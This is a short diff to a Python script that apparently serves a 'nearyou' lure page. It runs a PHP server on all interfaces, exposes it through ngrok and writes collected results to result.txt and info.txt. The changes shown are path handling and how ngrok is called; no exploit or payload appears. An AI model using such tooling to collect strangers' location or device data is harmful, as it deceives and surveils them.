@@ -14,10 +14,12 @@ G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
-swd = os.getcwd()
-swd = os.chdir(swd)
-swd = os.chdir('..')
-swd = os.getcwd()
+swdstring = os.path.realpath(__file__)
+swdlist = [i for i in swdstring]
+swdlist = swdlist[::-1]
+swdlist = swdlist[17:]
+swdlist = swdlist[::-1]
+swd = ''.join(swdlist)
 
 result = '{}/template/nearyou/php/result.txt'.format(swd)
 info = '{}/template/nearyou/php/info.txt'.format(swd)
@@ -74,10 +76,10 @@ def version():
 def ngrok():
 	global api, site, swd
 	print ('\n' + G + '[!]' + C + ' Starting PHP Server...' + W)
-	with open ('php.log', 'w') as phplog:
+	with open (swd + '/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
 	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
-	subp.Popen(['./termux/Ngrok/ngrok', 'http', '8080'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
+	subp.Popen(['ngrok', 'http', '8080'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
 	time.sleep(2)
 
 	def geturl():
